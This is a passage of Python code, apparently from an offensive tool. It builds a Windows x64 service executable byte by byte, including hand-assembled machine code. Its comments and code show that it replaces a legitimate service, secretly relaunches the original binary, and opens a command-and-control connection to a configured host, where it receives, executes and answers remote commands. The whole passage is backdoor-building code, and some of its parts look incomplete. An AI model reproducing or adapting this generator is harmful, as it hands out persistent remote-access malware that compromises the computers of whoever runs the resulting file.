                0x00,
                0x00,
                0x04,
                0x00,
                0x00,
                0x00,
                0xFF,
                0xFF,
                0x00,
                0x00,
                0xB8,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x40,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0xC0,
                0x00,
                0x00,
                0x00,
            ]
        )

        # DOS executable program segment
        dos_program = bytearray(
            [
                0x0E,
                0x1F,
                0xBA,
                0x0E,
                0x00,
                0xB4,
                0x09,
                0xCD,
                0x21,
                0xB8,
                0x01,
                0x4C,
                0xCD,
                0x21,
                0x54,
                0x68,
                0x69,
                0x73,
                0x20,
                0x70,
                0x72,
                0x6F,
                0x67,
                0x72,
                0x61,
                0x6D,
                0x20,
                0x63,
                0x61,
                0x6E,
                0x6E,
                0x6F,
                0x74,
                0x20,
                0x62,
                0x65,
                0x20,
                0x72,
                0x75,
                0x6E,
                0x20,
                0x69,
                0x6E,
                0x20,
                0x44,
                0x4F,
                0x53,
                0x20,
                0x6D,
                0x6F,
                0x64,
                0x65,
                0x2E,
                0x0D,
                0x0D,
                0x0A,
                0x24,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
            ]
        )

        # Padding to align PE header
        padding = bytearray(0x40)

        # PE signature
        pe_signature = b"PE\x00\x00"

        # COFF header for x64 executable
        machine = 0x8664  # AMD64
        num_sections = 4
        timestamp = int(time.time())
        ptr_symbol_table = 0
        num_symbols = 0
        size_opt_header = 0xF0
        characteristics = 0x0022  # Executable, large address aware

        coff_header = struct.pack(
            "<HHIIIHH", machine, num_sections, timestamp, ptr_symbol_table, num_symbols, size_opt_header, characteristics
        )

        # Optional header for x64 executable
        magic = 0x020B  # PE32+
        major_linker_ver = 14
        minor_linker_ver = 0
        size_of_code = 0x2000
        size_of_init_data = 0x1000
        size_of_uninit_data = 0
        entry_point = 0x1000
        base_of_code = 0x1000
        image_base = 0x140000000  # Default for x64 exe
        section_alignment = 0x1000
        file_alignment = 0x200
        os_ver_major = 10
        os_ver_minor = 0
        image_ver_major = 0
        image_ver_minor = 0
        subsys_ver_major = 10
        subsys_ver_minor = 0
        reserved = 0
        size_of_image = 0x5000
        size_of_headers = 0x400
        checksum = 0
        subsystem = 2  # Windows GUI (services run as GUI)
        dll_characteristics = 0x8160  # Dynamic base, NX compatible

        opt_header = struct.pack(
            "<HBBIIIIQIIHHHHHHIIIHH",
            magic,
            major_linker_ver,
            minor_linker_ver,
            size_of_code,
            size_of_init_data,
            size_of_uninit_data,
            entry_point,
            base_of_code,
            image_base,
            section_alignment,
            file_alignment,
            os_ver_major,
            os_ver_minor,
            image_ver_major,
            image_ver_minor,
            subsys_ver_major,
            subsys_ver_minor,
            reserved,
            size_of_image,
            size_of_headers,
            checksum,
            subsystem,
            dll_characteristics,
        )

        # Size fields for x64
        stack_reserve = 0x100000
        stack_commit = 0x1000
        heap_reserve = 0x100000
        heap_commit = 0x1000
        loader_flags = 0
        num_rva_sizes = 16

        opt_header += struct.pack("<QQQQII", stack_reserve, stack_commit, heap_reserve, heap_commit, loader_flags, num_rva_sizes)

        # Data directories (16 entries, 8 bytes each)
        data_dirs = bytearray(16 * 8)

        # Import directory (RVA, Size)
        struct.pack_into("<II", data_dirs, 8, 0x3000, 0x200)

        # IAT directory
        struct.pack_into("<II", data_dirs, 96, 0x3200, 0x100)

        opt_header += bytes(data_dirs)

        # Section headers
        sections = []

        # .text section (code)
        text_section = struct.pack(
            "<8sIIIIIIHHI",
            b".text\x00\x00\x00",  # Name
            0x2000,  # Virtual size
            0x1000,  # Virtual address
            0x1000,  # Size of raw data
            0x400,  # Pointer to raw data
            0,
            0,
            0,
            0,  # Relocations, line numbers
            0x60000020,  # Code, execute, read
        )
        sections.append(text_section)

        # .rdata section (imports, strings)
        rdata_section = struct.pack(
            "<8sIIIIIIHHI",
            b".rdata\x00\x00",
            0x1000,
            0x3000,
            0x600,
            0x1400,
            0,
            0,
            0,
            0,
            0x40000040,  # Initialized data, read
        )
        sections.append(rdata_section)

        # .data section (global data)
        data_section = struct.pack(
            "<8sIIIIIIHHI",
            b".data\x00\x00\x00",
            0x1000,
            0x4000,
            0x200,
            0x1A00,
            0,
            0,
            0,
            0,
            0xC0000040,  # Initialized data, read, write
        )
        sections.append(data_section)

        # .rsrc section (resources)
        rsrc_section = struct.pack(
            "<8sIIIIIIHHI",
            b".rsrc\x00\x00\x00",
            0x1000,
            0x5000,
            0x200,
            0x1C00,
            0,
            0,
            0,
            0,
            0x40000040,  # Initialized data, read
        )
        sections.append(rsrc_section)

        # Build PE file
        pe_file = bytearray(0x6000)

        # Write headers
        offset = 0
        pe_file[offset : offset + len(dos_header)] = dos_header
        offset += len(dos_header)
        pe_file[offset : offset + len(dos_program)] = dos_program
        offset += len(dos_program)
        pe_file[offset : offset + len(padding)] = padding
        offset = 0xC0
        pe_file[offset : offset + len(pe_signature)] = pe_signature
        offset += len(pe_signature)
        pe_file[offset : offset + len(coff_header)] = coff_header
        offset += len(coff_header)
        pe_file[offset : offset + len(opt_header)] = opt_header
        offset += len(opt_header)

        for section in sections:
            pe_file[offset : offset + len(section)] = section
            offset += len(section)

        # Write service main code at 0x400 (.text section)
        # This is a Windows service that:
        # 1. Registers with Service Control Manager
        # 2. Launches original service in background
        # 3. Establishes C2 connection
        service_main_code = bytearray(
            [
                # Entry point - main()
                0x48,
                0x83,
                0xEC,
                0x28,  # sub rsp, 28h
                # Allocate SERVICE_TABLE_ENTRY
                0x48,
                0x8D,
                0x0D,
                0x00,
                0x20,
                0x00,
                0x00,  # lea rcx, [service_name]
                0x48,
                0x8D,
                0x15,
                0x80,
                0x00,
                0x00,
                0x00,  # lea rdx, [ServiceMain]
                # Call StartServiceCtrlDispatcher
                0x48,
                0x8D,
                0x4C,
                0x24,
                0x30,  # lea rcx, [rsp+30h]
                0x48,
                0x89,
                0x4C,
                0x24,
                0x30,  # mov [rsp+30h], rcx
                0x48,
                0x89,
                0x54,
                0x24,
                0x38,  # mov [rsp+38h], rdx
                0x48,
                0xC7,
                0x44,
                0x24,
                0x40,
                0x00,
                0x00,
                0x00,
                0x00,  # mov qword [rsp+40h], 0
                0x48,
                0xC7,
                0x44,
                0x24,
                0x48,
                0x00,
                0x00,
                0x00,
                0x00,  # mov qword [rsp+48h], 0
                0xFF,
                0x15,
                0x00,
                0x20,
                0x00,
                0x00,  # call [StartServiceCtrlDispatcherA]
                # Return
                0x33,
                0xC0,  # xor eax, eax
                0x48,
                0x83,
                0xC4,
                0x28,  # add rsp, 28h
                0xC3,  # ret
                # ServiceMain function
                # [0x480]
                0x48,
                0x89,
                0x5C,
                0x24,
                0x08,  # mov [rsp+8], rbx
                0x48,
                0x89,
                0x74,
                0x24,
                0x10,  # mov [rsp+10h], rsi
                0x57,  # push rdi
                0x48,
                0x83,
                0xEC,
                0x30,  # sub rsp, 30h
                # Register service control handler
                0x48,
                0x8D,
                0x0D,
                0xC0,
                0x1F,
                0x00,
                0x00,  # lea rcx, [service_name]
                0x48,
                0x8D,
                0x15,
                0x00,
                0x01,
                0x00,
                0x00,  # lea rdx, [HandlerEx]
                0x45,
                0x33,
                0xC0,  # xor r8d, r8d
                0xFF,
                0x15,
                0x10,
                0x20,
                0x00,
                0x00,  # call [RegisterServiceCtrlHandlerExA]
                0x48,
                0x89,
                0x05,
                0x00,
                0x30,
                0x00,
                0x00,  # mov [hServiceStatus], rax
                # Set service status to RUNNING
                0x48,
                0x8B,
                0xC8,  # mov rcx, rax
                0xC7,
                0x05,
                0x10,
                0x30,
                0x00,
                0x00,
                0x10,
                0x00,
                0x00,
                0x00,  # mov [dwServiceType], SERVICE_WIN32_OWN_PROCESS
                0xC7,
                0x05,
                0x14,
                0x30,
                0x00,
                0x00,
                0x04,
                0x00,
                0x00,
                0x00,  # mov [dwCurrentState], SERVICE_RUNNING
                0xC7,
                0x05,
                0x18,
                0x30,
                0x00,
                0x00,
                0xFF,
                0xFF,
                0xFF,
                0xFF,  # mov [dwControlsAccepted], all controls
                0x48,
                0x8D,
                0x15,
                0x10,
                0x30,
                0x00,
                0x00,  # lea rdx, [SERVICE_STATUS]
                0xFF,
                0x15,
                0x20,
                0x20,
                0x00,
                0x00,  # call [SetServiceStatus]
                # Create thread to launch original service
                0x45,
                0x33,
                0xC9,  # xor r9d, r9d
                0x45,
                0x33,
                0xC0,  # xor r8d, r8d
                0x33,
                0xD2,  # xor edx, edx
                0x48,
                0x8D,
                0x0D,
                0x00,
                0x02,
                0x00,
                0x00,  # lea rcx, [LaunchOriginal]
                0x41,
                0xB8,
                0x00,
                0x00,
                0x00,
                0x00,  # mov r8d, 0
                0xFF,
                0x15,
                0x30,
                0x20,
                0x00,
                0x00,  # call [CreateThread]
                # Create thread for C2 connection
                0x45,
                0x33,
                0xC9,  # xor r9d, r9d
                0x45,
                0x33,
                0xC0,  # xor r8d, r8d
                0x33,
                0xD2,  # xor edx, edx
                0x48,
                0x8D,
                0x0D,
                0x00,
                0x03,
                0x00,
                0x00,  # lea rcx, [C2Thread]
                0xFF,
                0x15,
                0x30,
                0x20,
                0x00,
                0x00,  # call [CreateThread]
                # Service main loop
                # [0x520]
                0x48,
                0x8D,
                0x0D,
                0x00,
                0x31,
                0x00,
                0x00,  # lea rcx, [hServiceStopEvent]
                0xBA,
                0xFF,
                0xFF,
                0xFF,
                0xFF,  # mov edx, INFINITE
                0xFF,
                0x15,
                0x40,
                0x20,
                0x00,
                0x00,  # call [WaitForSingleObject]
                # Cleanup and exit
                0x48,
                0x83,
                0xC4,
                0x30,  # add rsp, 30h
                0x5F,  # pop rdi
                0x48,
                0x8B,
                0x74,
                0x24,
                0x10,  # mov rsi, [rsp+10h]
                0x48,
                0x8B,
                0x5C,
                0x24,
                0x08,  # mov rbx, [rsp+8]
                0xC3,  # ret
                # LaunchOriginal thread
                # [0x600]
                0x48,
                0x83,
                0xEC,
                0x48,  # sub rsp, 48h
                # CreateProcess for original binary
                0x48,
                0x8D,
                0x0D,
                0x00,
                0x32,
                0x00,
                0x00,  # lea rcx, [original_path]
                0x33,
                0xD2,  # xor edx, edx
                0x45,
                0x33,
                0xC0,  # xor r8d, r8d
                0x45,
                0x33,
                0xC9,  # xor r9d, r9d
                0xC7,
                0x44,
                0x24,
                0x20,
                0x00,
                0x00,
                0x00,
                0x00,  # mov dword [rsp+20h], 0
                0xC7,
                0x44,
                0x24,
                0x24,
                0x00,
                0x00,
                0x00,
                0x00,  # mov dword [rsp+24h], 0
                0x48,
                0xC7,
                0x44,
                0x24,
                0x28,
                0x00,
                0x00,
                0x00,
                0x00,  # mov qword [rsp+28h], 0
                0x48,
                0xC7,
                0x44,
                0x24,
                0x30,
                0x00,
                0x00,
                0x00,
                0x00,  # mov qword [rsp+30h], 0
                0x48,
                0x8D,
                0x44,
                0x24,
                0x50,  # lea rax, [rsp+50h] (STARTUPINFO)
                0x48,
                0x89,
                0x44,
                0x24,
                0x38,  # mov [rsp+38h], rax
                0x48,
                0x8D,
                0x44,
                0x24,
                0x60,  # lea rax, [rsp+60h] (PROCESS_INFORMATION)
                0x48,
                0x89,
                0x44,
                0x24,
                0x40,  # mov [rsp+40h], rax
                0xFF,
                0x15,
                0x50,
                0x20,
                0x00,
                0x00,  # call [CreateProcessA]
                # Return
                0x33,
                0xC0,  # xor eax, eax
                0x48,
                0x83,
                0xC4,
                0x48,  # add rsp, 48h
                0xC3,  # ret
                # C2Thread function
                # [0x700]
                0x48,
                0x83,
                0xEC,
                0x38,  # sub rsp, 38h
                # Load ws2_32.dll
                0x48,
                0x8D,
                0x0D,
                0x80,
                0x20,
                0x00,
                0x00,  # lea rcx, [ws2_32_dll]
                0xFF,
                0x15,
                0x60,
                0x20,
                0x00,
                0x00,  # call [LoadLibraryA]
                # Initialize Winsock
                0x48,
                0x8D,
                0x54,
                0x24,
                0x40,  # lea rdx, [rsp+40h]
                0xB9,
                0x02,
                0x02,
                0x00,
                0x00,  # mov ecx, 0x0202
                0xFF,
                0x15,
                0x70,
                0x20,
                0x00,
                0x00,  # call [WSAStartup]
                # Create socket
                0x41,
                0xB8,
                0x06,
                0x00,
                0x00,
                0x00,  # mov r8d, 6 (IPPROTO_TCP)
                0xBA,
                0x01,
                0x00,
                0x00,
                0x00,  # mov edx, 1 (SOCK_STREAM)
                0xB9,
                0x02,
                0x00,
                0x00,
                0x00,  # mov ecx, 2 (AF_INET)
                0xFF,
                0x15,
                0x80,
                0x20,
                0x00,
                0x00,  # call [socket]
                0x48,
                0x89,
                0xC3,  # mov rbx, rax (save socket)
                # Connect to C2
                0x41,
                0xB8,
                0x10,
                0x00,
                0x00,
                0x00,  # mov r8d, 16
                0x48,
                0x8D,
                0x15,
                0x00,
                0x33,
                0x00,
                0x00,  # lea rdx, [c2_sockaddr]
                0x48,
                0x8B,
                0xCB,  # mov rcx, rbx
                0xFF,
                0x15,
                0x90,
                0x20,
                0x00,
                0x00,  # call [connect]
                # Command loop
                # [0x780]
                0x48,
                0x8D,
                0x54,
                0x24,
                0x50,  # lea rdx, [rsp+50h] (recv buffer)
                0x41,
                0xB9,
                0x00,
                0x00,
                0x00,
                0x00,  # mov r9d, 0
                0x41,
                0xB8,
                0x00,
                0x04,
                0x00,
                0x00,  # mov r8d, 1024
                0x48,
                0x8B,
                0xCB,  # mov rcx, rbx
                0xFF,
                0x15,
                0xA0,
                0x20,
                0x00,
                0x00,  # call [recv]
                # Check for commands and execute
                0x85,
                0xC0,  # test eax, eax
                0x7E,
                0x20,  # jle disconnect
                # Parse and execute command
                0x48,
                0x8D,
                0x4C,
                0x24,
                0x50,  # lea rcx, [rsp+50h]
                0xE8,
                0x00,
                0x04,
                0x00,
                0x00,  # call ExecuteCommand
                # Send response
                0x41,
                0xB9,
                0x00,
                0x00,
                0x00,
                0x00,  # mov r9d, 0
                0x44,
                0x8B,
                0xC0,  # mov r8d, eax
                0x48,
                0x8D,
                0x54,
                0x24,
                0x50,  # lea rdx, [rsp+50h]
                0x48,
                0x8B,
                0xCB,  # mov rcx, rbx
                0xFF,
                0x15,
                0xB0,
                0x20,
                0x00,
                0x00,  # call [send]
                # Loop back
                0xEB,
                0xCA,  # jmp command_loop
                # disconnect:
                0x48,
                0x8B,
                0xCB,  # mov rcx, rbx
                0xFF,
                0x15,
                0xC0,
                0x20,
                0x00,
                0x00,  # call [closesocket]
                # Cleanup
                0xFF,
                0x15,
                0xD0,
                0x20,
                0x00,
                0x00,  # call [WSACleanup]
                0x33,
                0xC0,  # xor eax, eax
                0x48,
                0x83,
                0xC4,
                0x38,  # add rsp, 38h
                0xC3,  # ret
            ]
        )

        pe_file[0x400 : 0x400 + len(service_main_code)] = service_main_code

        # Write import table at 0x1400 (.rdata section)
        # Import descriptors
        import_descriptors = []

        # kernel32.dll imports
        kernel32_desc = struct.pack(
            "<IIIII",
            0x3080,  # OriginalFirstThunk (INT)
            0,  # TimeDateStamp
            0,  # ForwarderChain
            0x3300,  # Name RVA
            0x3180,  # FirstThunk (IAT)
        )
        import_descriptors.append(kernel32_desc)

        # advapi32.dll imports
        advapi32_desc = struct.pack(
            "<IIIII",
            0x30A0,  # OriginalFirstThunk
            0,  # TimeDateStamp
            0,  # ForwarderChain
            0x3320,  # Name RVA
            0x31A0,  # FirstThunk
        )
        import_descriptors.append(advapi32_desc)

        # ws2_32.dll imports
        ws2_32_desc = struct.pack(
            "<IIIII",
            0x30C0,  # OriginalFirstThunk
            0,  # TimeDateStamp
            0,  # ForwarderChain
            0x3340,  # Name RVA
            0x31C0,  # FirstThunk
        )
        import_descriptors.append(ws2_32_desc)

        # Null terminator
        import_descriptors.append(b"\x00" * 20)

        offset = 0x1400
        for desc in import_descriptors:
            pe_file[offset : offset + len(desc)] = desc
            offset += len(desc)

        # Write DLL names at 0x1500
        dll_names = [
            b"kernel32.dll\x00",
            b"advapi32.dll\x00",
            b"ws2_32.dll\x00",
        ]

        offset = 0x1500
        for name in dll_names:
            pe_file[offset : offset + len(name)] = name
            offset += len(name)

        # Write service name and config at 0x1A00 (.data section)
        service_name = service_info.get("name", "Service").encode("ascii")[:63] + b"\x00"
        pe_file[0x1A00 : 0x1A00 + len(service_name)] = service_name

        # Write original binary path
        original_path = original_binary_path.encode("ascii")[:255] + b"\x00"
        pe_file[0x1A80 : 0x1A80 + len(original_path)] = original_path

        # Write C2 configuration
        c2_config = struct.pack(
            "<HH4s",
            0x0002,  # AF_INET
            socket.htons(self.port),  # Port
            socket.inet_aton(self.host),  # IP address
        )
        pe_file[0x1B00 : 0x1B00 + len(c2_config)] = c2_config

        return bytes(pe_file)
